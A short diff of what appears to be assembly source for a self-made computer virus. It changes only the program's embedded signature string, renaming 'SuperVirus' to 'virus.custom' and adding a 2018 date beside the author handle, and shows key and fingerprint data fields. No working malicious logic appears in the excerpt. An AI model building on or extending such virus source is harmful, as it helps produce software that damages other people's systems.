@@ -49,7 +49,7 @@ dataearly:
 ;0
 key: db `KEY000000000KEY\0`
 ;2
-signature: db `\0SuperVirus version 1.3 (c)oded by ndombre-agadhgad-`
+signature: db `\0virus.custom version 1.3 (c)oded dec-2018 by ndombre-agadhgad - `
 fingerprint: db `AAAAAAAA`,0
 
 
